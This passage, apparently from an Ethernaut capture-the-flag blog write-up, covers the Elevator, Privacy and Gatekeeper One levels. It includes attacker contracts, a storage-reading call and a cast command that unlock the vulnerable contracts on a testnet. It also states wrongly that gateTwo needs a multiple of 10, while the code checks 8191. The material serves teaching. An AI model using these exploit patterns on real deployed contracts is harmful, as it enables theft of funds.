&lt;p&gt;&lt;code&gt;transfer&lt;&#x2F;code&gt; and &lt;code&gt;send&lt;&#x2F;code&gt; are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork &lt;a href=&quot;https:&#x2F;&#x2F;diligence.consensys.net&#x2F;blog&#x2F;2019&#x2F;09&#x2F;stop-using-soliditys-transfer-now&#x2F;&quot;&gt;Source 1&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;forum.openzeppelin.com&#x2F;t&#x2F;reentrancy-after-istanbul&#x2F;1742&quot;&gt;Source 2&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;elevator&quot;&gt;Elevator&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Building &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Elevator &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; top;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint public&lt;&#x2F;span&gt;&lt;span&gt; floor;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;goTo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_floor) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    Building building &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Building&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span&gt; building.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(_floor)) {
&lt;&#x2F;span&gt;&lt;span&gt;      floor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _floor;
&lt;&#x2F;span&gt;&lt;span&gt;      top &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; building.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(floor);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Contract defined a interface &lt;code&gt;Building&lt;&#x2F;code&gt; and will be Instantiated when &lt;code&gt;goTo&lt;&#x2F;code&gt; function is called.&lt;&#x2F;p&gt;
&lt;p&gt;Thats mean &lt;code&gt;msg.sender&lt;&#x2F;code&gt; should be CA, with &lt;code&gt;goTo&lt;&#x2F;code&gt; function meet the interface requirements. And to exploit it we should let &lt;code&gt;isLastFloor&lt;&#x2F;code&gt; return false at first, and true at second time.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;.&#x2F;Elevator.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Hack &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_instance) {
&lt;&#x2F;span&gt;&lt;span&gt;    target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Elevator&lt;&#x2F;span&gt;&lt;span&gt;(_instance);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  Elevator &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;target;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    if(result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== true&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;      result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    else {
&lt;&#x2F;span&gt;&lt;span&gt;      result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    return result;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;attack&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    target.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;goTo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;privacy&quot;&gt;Privacy&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Privacy &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 public&lt;&#x2F;span&gt;&lt;span&gt; ID &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;timestamp&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint8 private&lt;&#x2F;span&gt;&lt;span&gt; flattening &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint8 private&lt;&#x2F;span&gt;&lt;span&gt; denomination &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;255&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint16 private&lt;&#x2F;span&gt;&lt;span&gt; awkwardness &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= uint16&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;timestamp&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;private&lt;&#x2F;span&gt;&lt;span&gt; data;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory &lt;&#x2F;span&gt;&lt;span&gt;_data) {
&lt;&#x2F;span&gt;&lt;span&gt;    data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _data;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;unlock&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes16 &lt;&#x2F;span&gt;&lt;span&gt;_key) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(_key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== bytes16&lt;&#x2F;span&gt;&lt;span&gt;(data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]));
&lt;&#x2F;span&gt;&lt;span&gt;    locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;    A bunch of super advanced solidity algorithms...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;      ,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;      .,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;      *.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^         ,---&#x2F;V\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;      `*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.    ~|__(o.o)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;      ^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;  UU  UU
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;  *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Still, there is not real “private” variable in ethereum. Even the memory of contract could be view by given API of web3.js.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&amp;gt; (await web3.eth.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getStorageAt&lt;&#x2F;span&gt;&lt;span&gt;(contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt; &amp;#39;0x1603c85b3f007519d352444d1eee059b52fbf7c375579129a1903cead8e3ca82&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cast call 0x34a17DfF1f3CCde4d2948c58658993D9F0320050 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;unlock(bytes16)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r wss:&#x2F;&#x2F;ethereum-sepolia.publicnode.com --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;- 0x1603c85b3f007519d352444d1eee059b -f
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;0x
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;del&gt;I didn’t know why it output &lt;code&gt;0x&lt;&#x2F;code&gt;. but it actually be worked.（x&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;gatekeeper-one&quot;&gt;Gatekeeper One&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GatekeeperOne &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; entrant;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateOne&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender != tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateTwo&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;gasleft&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8191 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateThree&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8 &lt;&#x2F;span&gt;&lt;span&gt;_gateKey) {
&lt;&#x2F;span&gt;&lt;span&gt;      require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== uint16&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)), &amp;quot;GatekeeperOne: invalid gateThree part one&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;      require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!= uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey), &amp;quot;GatekeeperOne: invalid gateThree part two&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;      require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== uint16&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;)), &amp;quot;GatekeeperOne: invalid gateThree part three&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8 &lt;&#x2F;span&gt;&lt;span&gt;_gateKey) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public gateOne gateTwo gateThree&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey) returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    entrant &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This challenge need us to pass three check of modifier.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;gateOne: just the previous challenge &lt;code&gt;Telephone&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;gateTwo: gas remaining required to be an integer multiple of 10. Brute force with some meaningless code could pass this.&lt;&#x2F;li&gt;
&lt;li&gt;gateThree: three requirements to &lt;code&gt;_gateKey&lt;&#x2F;code&gt; param:
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_gateKey[4:7]&lt;&#x2F;code&gt; == &lt;code&gt;_gateKey[6:7]&lt;&#x2F;code&gt; (&lt;code&gt;_gate[4:5]&lt;&#x2F;code&gt; == &lt;code&gt;0x0000&lt;&#x2F;code&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_gateKey[4:7]&lt;&#x2F;code&gt; != &lt;code&gt;_gateKey[0:7]&lt;&#x2F;code&gt;(&lt;code&gt;_gateKey[0:3]&lt;&#x2F;code&gt; != &lt;code&gt;0x00000000&lt;&#x2F;code&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_gateKey[4:7]&lt;&#x2F;code&gt; == &lt;code&gt;tx.origin[28:29]&lt;&#x2F;code&gt;(&lt;code&gt;_gateKey[4:5]&lt;&#x2F;code&gt;== &lt;code&gt;0x0000&lt;&#x2F;code&gt; &amp;amp;&amp;amp; &lt;code&gt;_gateKey[6:7]&lt;&#x2F;code&gt; == &lt;code&gt;tx.origin[28:29]&lt;&#x2F;code&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
